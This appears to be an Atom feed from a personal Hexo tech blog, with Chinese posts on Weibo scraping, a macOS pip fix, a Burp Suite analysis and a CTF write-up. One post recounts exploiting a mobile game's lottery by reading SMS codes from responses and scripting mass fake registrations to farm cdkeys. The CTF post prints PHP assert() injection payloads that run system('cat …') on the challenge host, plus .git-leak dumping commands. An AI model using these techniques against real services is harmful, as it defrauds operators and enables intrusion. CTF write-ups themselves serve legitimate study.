<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>NikoVerse</title>
  
  <subtitle>Tech. for better life.</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-07-06T02:30:54.561Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Niko Pang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>tags</title>
    <link href="http://example.com/2021/07/05/tags/"/>
    <id>http://example.com/2021/07/05/tags/</id>
    <published>2021-07-05T14:30:54.000Z</published>
    <updated>2021-07-06T02:30:54.561Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="http://example.com/2021/07/05/test/"/>
    <id>http://example.com/2021/07/05/test/</id>
    <published>2021-07-05T14:28:56.000Z</published>
    <updated>2021-07-06T02:28:56.338Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/07/05/hello-world/"/>
    <id>http://example.com/2021/07/05/hello-world/</id>
    <published>2021-07-05T09:58:11.180Z</published>
    <updated>2021-07-05T09:58:11.180Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次有意思的burp抓包经历</title>
    <link href="http://example.com/2017/09/23/Burp2CrackActivity/"/>
    <id>http://example.com/2017/09/23/Burp2CrackActivity/</id>
    <published>2017-09-23T21:21:01.000Z</published>
    <updated>2021-07-06T09:22:06.762Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Originally wrote on Sep. 24th 2017</p></blockquote><h3 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a><strong>0x00 Introduction</strong></h3><p>又是一个不断电不断网的周末。</p><p>又打开了某手游…发现有个抽奖活动！！ 通过奖品兑换cdkey拿一些奖品。</p><p>抽奖盘大概类似这样的东西⬇️ ⬇️</p><p><img src="https://pic4.zhimg.com/v2-1a0e944f384ade0cbfb88896817f3e57_b.jpg" alt="img"></p><p>左下角有个抽奖次数，上传图片还可以多次抽奖。 但不知道怎么搞的突然意外增加了抽奖次数，让我多抽了一次。这极大的引起了兴趣，感觉这活动页其中好像有些问题，本着打破砂锅问到底的精神，我打开了<code>Burpsuite</code>. </p><h3 id="0x01-开始进行抓包分析"><a href="#0x01-开始进行抓包分析" class="headerlink" title="0x01 开始进行抓包分析"></a><strong>0x01 开始进行抓包分析</strong></h3><p>刚开始对整个抽奖的过程进行一个抓包分析。 通过Foxyproxy这个浏览器插件对网页进行代理，包信息被burp捕获到，之后send to Repeater。Foxyproxy十分好用，简直就是配合burp的神器，一键代理十分方便，在chrome和firefox应用商店中均可下载.</p><p><strong>通过返回的Response包我们发现：</strong></p><p>① 登录后默认有一次抽奖的机会。cishu:1</p><p>② 上传文件可以增加抽奖次数cishu++，最高可上传4次就会返回错误信息了。</p><p><img src="https://pic4.zhimg.com/v2-5f43e8c1a9f4c103e00694119ba3b04f_b.jpg" alt="img"></p><p><img src="https://pic4.zhimg.com/v2-49615c0421b34110909aae99d1189e3f_b.jpg" alt="img"></p><p>③ 每次抽奖后cishu会-1，并返回cdkey的值。通过兑换就能拿到我们想要的礼物。</p><p><img src="https://pic4.zhimg.com/v2-b511887273be778f170cc2d07151606b_b.jpg" alt="img"></p><p>分析之后就开始进行改requests的包，对比以抽奖的cookie和未抽奖的cookie，发现这并不是改包就能完成的,改cookie并不能绕过对现有用户的认证，仍需要重新登录…也不能改cishu，因为cishu并不是在requests包中进行请求的。</p><h3 id="0x02-注册环节"><a href="#0x02-注册环节" class="headerlink" title="0x02 注册环节"></a><strong>0x02 注册环节</strong></h3><p>花费了很长时间研究在改包上，但并没有什么突破。无法通过改cishu来实现我们的目的，那就换个方向去研究一下用户注册以及登录。之后我就去抓一下注册登录的包来观察一番。因为抽奖规则就是新账号注册就有抽奖机会，而这一过程并不检测IP。仅通过手机号进行关联。</p><p>将注册的包send to repeater来观察一番验证码的流程，有了很大的收获。</p><p>第一次请求:</p><p><img src="https://pic2.zhimg.com/v2-bab4cd11cce81e0aaa0022bf4767feb1_b.jpg" alt="img"></p><p>并没有返回任何值~</p><p>本着打CTF的比赛经验，我又习惯性的请求了第二次：<strong>页面上返回了验证码！</strong>response返回了int(255035)。</p><p><img src="https://pic2.zhimg.com/v2-63b1c384c2caf0532a39236004ff6a85_b.jpg" alt="img"></p><p>这样我们就能通过get请求来接受返回的response包的信息，得到验证码。这样就突破了注册的限制，通过脚本的编写可以完成之前所进行的操作。</p><h3 id="0x03-After-writing"><a href="#0x03-After-writing" class="headerlink" title="0x03 After writing."></a><strong>0x03 After writing.</strong></h3><p>之后就是写了python的代码来完成了自动化的过程，添加了random的库随机生成了手机号并通过shell脚本一直运行，收获了很多很多的cdkey，造福了朋友和自己。</p><p><strong>随机生成手机号的代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mobile_nums=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">ran_num=random.uniform(<span class="number">13</span>,<span class="number">14</span>)*<span class="number">1000000000</span></span><br><span class="line">ran_num=<span class="built_in">str</span>(ran_num)</span><br><span class="line">ran_mobile=ran_num[:<span class="number">11</span>]</span><br><span class="line">mobile_nums.append(ran_mobile)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;/Users/Niko/Desktop/cdkey&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">f.write(<span class="string">&quot;-----------------------------\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;mobile_nums=&quot;</span>+<span class="built_in">str</span>(mobile_nums)+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>shell脚本：</strong></p><p>写了shell脚本来循环跑了50次，开了2个进程，吃完饭发现成果颇丰ð~</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">i=0</span><br><span class="line">while [ &quot;$i&quot; !=  &quot;50&quot; ]</span><br><span class="line">do</span><br><span class="line">python ~.py</span><br><span class="line">i=$(($i+1))</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>本体就是requests库的应用，害怕被顺丰我就不po了…</p><h3 id="0x04-PS"><a href="#0x04-PS" class="headerlink" title="0x04 PS"></a><strong>0x04 PS</strong></h3><ol><li>一次很有趣的经历让我对网络安全又增加了兴趣，永远保持着好奇心是最重要和有趣的！</li><li>不管是作为开发者还是渗透测试人员，都要严格代码规范，以及加强安全性检测和管理。抓了包发现很多变量名都很不formal，某种程度上坚定了我一定要攻克它的决心2333333</li></ol><p>感谢围观。</p><p><em>By Niko.</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Originally wrote on Sep. 24th 2017&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="CyberSecurity" scheme="http://example.com/tags/CyberSecurity/"/>
    
  </entry>
  
  <entry>
    <title>简单的免登陆抓取新浪微博数据</title>
    <link href="http://example.com/2017/08/22/Crawlerweibonotloggin/"/>
    <id>http://example.com/2017/08/22/Crawlerweibonotloggin/</id>
    <published>2017-08-22T17:09:26.000Z</published>
    <updated>2021-07-06T08:44:23.932Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Originally wrote on Aug. 23nd, 2017</p></blockquote><h2 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h2><p>饭偶像之后承担了写群机器人的工作，所以最近一直在鼓弄爬虫，写了集资实时监控，现在是微博监控，之后还要写其他东西…库亚西。</p><p>之前就看过很多爬微博的一些文章，不过大多需要模拟登录，或者是调用weibo的api，后来貌似API权限逐渐降低，也就变得不实用了。。。</p><p>手机版weibo<code>http://m.weibo.com</code>后加uid便可以进行博文。</p><p>这个爬虫的小程序是通过手机版weibo<code>http://m.weibo.com</code>来进行模拟请求，不是通过分析html代码再通过筛选来完成数据抓取。<br>简单的介绍就是这样，后面是正文！<br>33</p><h2 id="0x01-Let’s-Start"><a href="#0x01-Let’s-Start" class="headerlink" title="0x01 Let’s Start"></a>0x01 Let’s Start</h2><h4 id="1-获取微博用户的对应Id"><a href="#1-获取微博用户的对应Id" class="headerlink" title="1. 获取微博用户的对应Id"></a>1. 获取微博用户的对应Id</h4><blockquote><p>使用的工具是：Chrome 开发者工具<br>Windows下快捷键：F12<br>MacOS下快捷键：alt+cmd+i</p></blockquote><p>打开 开发者工具-选中network-在左边选中带有<code>getIndex?</code>的包</p><p><img src="https://cdn.jsdelivr.net/gh/pyf0311/myPrivateIMGBed/markdown/1625547148305.jpg" alt="img"></p><p>获取我们所需要的<code>uid</code>和<code>containerId</code>.</p><p><img src="https://cdn.jsdelivr.net/gh/pyf0311/myPrivateIMGBed/markdown/1625547698035.jpg" alt="img"></p><p>PS:虽然Query String字段有很多项，但仅需要uid和containerId就可以定位到置顶微博用户。</p><h4 id="2-寻找所需要的请求"><a href="#2-寻找所需要的请求" class="headerlink" title="2. 寻找所需要的请求"></a>2. 寻找所需要的请求</h4><p>可见它是有很多JSON数据在一起的请求包</p><p><img src="https://cdn.jsdelivr.net/gh/pyf0311/myPrivateIMGBed/markdown/1625547904957.jpg" alt="img"></p><p>而微博正文就隐藏在这个请求包中的mblog中</p><p><img src="https://cdn.jsdelivr.net/gh/pyf0311/myPrivateIMGBed/markdown/1625547802463.jpg" alt="img"></p><h4 id="3-原始数据获取及转码"><a href="#3-原始数据获取及转码" class="headerlink" title="3. 原始数据获取及转码"></a>3. 原始数据获取及转码</h4><p>我们来通过 <code>requests</code> 库写一个简单的模拟请求。</p><p>在这里我们使用py3。相比于py2的优点是不需要额外进行 <code>unicode</code> to 中文的转化。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;https://m.weibo.cn/api/container/getIndex&quot;</span></span><br><span class="line">payload=&#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">&#x27;uid&#x27;</span>,<span class="string">&#x27;value&#x27;</span>:<span class="string">&#x27;5879771257&#x27;</span>,<span class="string">&#x27;containerid&#x27;</span>:<span class="string">&#x27;1076035879771257&#x27;</span>&#125;</span><br><span class="line">r=requests.post(url,data=payload)</span><br><span class="line">raw_text=r.text</span><br></pre></td></tr></table></figure><p>如果是py2的话，还要<code>raw_text=r.text.encode().decode()</code></p><p>encode之后是byte格式，decode使其变成str格式。    </p><h4 id="4-JSON转换成dict"><a href="#4-JSON转换成dict" class="headerlink" title="4. JSON转换成dict"></a>4. JSON转换成dict</h4><p>数据本来就是JSON对象。通过<code>json.loads()</code>转换为python的数据字典dict.<br>再通过dict的定位就可以抓取到微博内容了。</p><h2 id="0x02-完整代码"><a href="#0x02-完整代码" class="headerlink" title="0x02 完整代码"></a>0x02 完整代码</h2><pre><code>#原始URL:https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=5931004865&amp;containerid=1076035931004865import requestsimport jsonurl=&quot;https://m.weibo.cn/api/container/getIndex&quot;payload=&#123;&#39;type&#39;:&#39;uid&#39;,&#39;value&#39;:&#39;5879771257&#39;,&#39;containerid&#39;:&#39;1076035879771257&#39;&#125;r=requests.post(url,data=payload)raw_text=r.textd=json.loads(raw_text)for i in range(10):    print(d[&quot;cards&quot;][i][&quot;mblog&quot;][&quot;text&quot;])</code></pre><h2 id="0x03-PS"><a href="#0x03-PS" class="headerlink" title="0x03 PS"></a>0x03 PS</h2><ol><li><p>不仅仅是博文内容，个人资料等只要出现在m.weibo.com的内容均可以爬取下来。</p></li><li><p>一个请求包含最多10条微博，可通过再末尾加入page页数来继续循环模拟请求。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h1><p> <a href="https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=5879771257&amp;containerid=1076035879771257&amp;page=2">https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=5879771257&amp;containerid=1076035879771257&amp;page=2</a></p></li><li><p>有其他问题可以在评论框提出。尚未发现banIP的情况。</p></li></ol><h2 id="0x04-Update-in-2021"><a href="#0x04-Update-in-2021" class="headerlink" title="0x04 Update in 2021"></a>0x04 Update in 2021</h2><p>本项目已归档。</p><p>爬虫及队列更新请于github查看。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Originally wrote on Aug. 23nd, 2017&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerl</summary>
      
    
    
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>macOS 下通过pip安装Ipython权限问题解决</title>
    <link href="http://example.com/2017/02/15/SolutionIpythonInstall/"/>
    <id>http://example.com/2017/02/15/SolutionIpythonInstall/</id>
    <published>2017-02-15T20:50:12.000Z</published>
    <updated>2021-07-06T08:55:53.903Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Originally wrote on Feb. 16th 2017</p></blockquote><h3 id="0x00-Before-writing"><a href="#0x00-Before-writing" class="headerlink" title="0x00 Before writing"></a>0x00 Before writing</h3><p>安装了<code>pip</code>之后就开始安装<code>ipython</code>了。使用<code>sudo pip install ipython</code>却一直显示_Operation not<br>permitted_这让我非常苦恼。</p><blockquote><p>本机 macOS Sierra 10.12.3</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Exception:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/basecommand.py&quot;</span>, line 209, <span class="keyword">in</span> main</span><br><span class="line">    status = self.run(options, args)</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/commands/install.py&quot;</span>, line 317, <span class="keyword">in</span> run</span><br><span class="line">    prefix=options.prefix_path,</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/req/req_set.py&quot;</span>, line 732, <span class="keyword">in</span> install</span><br><span class="line">    **kwargs</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/req/req_install.py&quot;</span>, line 835, <span class="keyword">in</span> install</span><br><span class="line">    self.move_wheel_files(self.source_dir, root=root, prefix=prefix)</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/req/req_install.py&quot;</span>, line 1030, <span class="keyword">in</span> move_wheel_files</span><br><span class="line">    isolated=self.isolated,</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/wheel.py&quot;</span>, line 376, <span class="keyword">in</span> move_wheel_files</span><br><span class="line">    clobber(<span class="built_in">source</span>, dest, False, fixer=fixer, filter=filter)</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/wheel.py&quot;</span>, line 315, <span class="keyword">in</span> clobber</span><br><span class="line">    ensure_dir(destdir)</span><br><span class="line">  File <span class="string">&quot;/Library/Python/2.7/site-packages/pip/utils/__init__.py&quot;</span>, line 83, <span class="keyword">in</span> ensure_dir</span><br><span class="line">    os.makedirs(path)</span><br><span class="line">  File <span class="string">&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.py&quot;</span>, line 150, <span class="keyword">in</span> makedirs</span><br><span class="line">    makedirs(head, mode)</span><br><span class="line">  File <span class="string">&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.py&quot;</span>, line 150, <span class="keyword">in</span> makedirs</span><br><span class="line">    makedirs(head, mode)</span><br><span class="line">  File <span class="string">&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.py&quot;</span>, line 157, <span class="keyword">in</span> makedirs</span><br><span class="line">    mkdir(name, mode)</span><br><span class="line">OSError: [Errno 1] Operation not permitted: <span class="string">&#x27;/System/Library/Frameworks/Python.framework/Versions/2.7/share&#x27;</span></span><br></pre></td></tr></table></figure><p>提示是权限问题，但是却发现改成root也是不能成功，搁置了一下。</p><h3 id="0x01-SIP机制"><a href="#0x01-SIP机制" class="headerlink" title="0x01 SIP机制"></a>0x01 SIP机制</h3><p>google了很久发现了一个叫做SIP的机制被应用到MAC OSX EI<br>Capitan中增加了一个SIP功能，不管你是不是su，都会阻止你在系统目录下进行操作……</p><p>既然是一种机制，那就只能想着去关上就好了。<br>又找到了解决的办法：</p><blockquote><p>(1) 重启OSX系统，然后按住Command+R</p><p>(2) 出现界面之后，选择Utilities menu中Terminal</p><p>(3) 在Terminal中输入csrutil disable关闭SIP(csrutil enable打开SIP)</p><p>(4) 重启reboot OSX</p></blockquote><h3 id="0x02-方式改进"><a href="#0x02-方式改进" class="headerlink" title="0x02 方式改进"></a>0x02 方式改进</h3><p>果然上面那种方法看着很难受，不过却从原理上解释了为什么会出现deny。</p><p><strong>不过后来发现这并不是最优雅的方法！！</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ipython --user -U</span><br></pre></td></tr></table></figure><p>基于用户的权限来安装包。</p><p>执行之后会提示：</p><blockquote><p>Installing collected packages: setuptools<br>Successfully installed setuptools-34.2.0</p></blockquote><p>继而安装成功setuptools.<br>再通过<code>easy_install ipython</code>就能成功安装ipython了。</p><h3 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03 引用"></a>0x03 引用</h3><ol><li><p><a href="http://xiaorui.cc/2016/03/27/%E8%A7%A3%E5%86%B3mac-osx%E4%B8%8Bpip%E5%AE%89%E8%A3%85ipython%E6%9D%83%E9%99%90%E7%9A%84%E9%97%AE%E9%A2%98/">http://xiaorui.cc/2016/03/27/解决mac-osx下pip安装ipython权限的问题/</a></p></li><li><p><a href="http://www.freebuf.com/articles/system/97411.html">http://www.freebuf.com/articles/system/97411.html</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Originally wrote on Feb. 16th 2017&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-Before-writing&quot;&gt;&lt;a href=&quot;#0x00-Before-writing&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="macOS" scheme="http://example.com/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>关于Git/config.泄露的小结 及 assert()函数注入初探</title>
    <link href="http://example.com/2016/10/25/GitLeak/"/>
    <id>http://example.com/2016/10/25/GitLeak/</id>
    <published>2016-10-25T20:57:43.000Z</published>
    <updated>2021-07-06T09:06:16.040Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Originally wrote on Oct. 26th 2016</p></blockquote><h3 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h3><p>晚上Ifuryst发了个web题链接玩玩 <a href="http://web.chal.csaw.io:8000/">http://web.chal.csaw.io:8000/</a>.</p><p>浏览了一下发现了简直是直钩，<strong>你好我知道有猫腻。git泄漏！</strong></p><h3 id="0x01-GitHack"><a href="#0x01-GitHack" class="headerlink" title="0x01 GitHack"></a>0x01 GitHack</h3><p>GitHack.py <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py URL/.git</span><br></pre></td></tr></table></figure><p>检测到了相关目录并下载源码到我的本地。<br><code>flag.php</code> 的源码没啥东西…</p><h3 id="0x02-assert-注入"><a href="#0x02-assert-注入" class="headerlink" title="0x02 assert() 注入"></a>0x02 assert() 注入</h3><p>打开了<code>index.php</code>,看到了很多以<code>assert()</code>函数，通过Ifuryst点拨，知道存在<code>assert()注入</code>。<br>用“||”进行屏蔽前面的内容，之后在输入</p><pre><code>http://web.chal.csaw.io:8000/?page=NIKO || print(file_get_contents(&quot;templates/flag.php&quot;));//http://web.chal.csaw.io:8000/?page=NIKO) || system(&quot;cat templates/flag.php &quot;);//</code></pre><h3 id="0x03-rip-git-pl"><a href="#0x03-rip-git-pl" class="headerlink" title="0x03 rip-git.pl"></a>0x03 rip-git.pl</h3><p>除了GitHack之外，基于Perl写的rip-git也很好用。</p><p>获得页面源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl rip-git.pl -v -u http://web.chal.csaw.io:8000/.git</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Originally wrote on Oct. 26th 2016&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 </summary>
      
    
    
    
    
    <category term="CyberSecurity" scheme="http://example.com/tags/CyberSecurity/"/>
    
  </entry>
  
</feed>
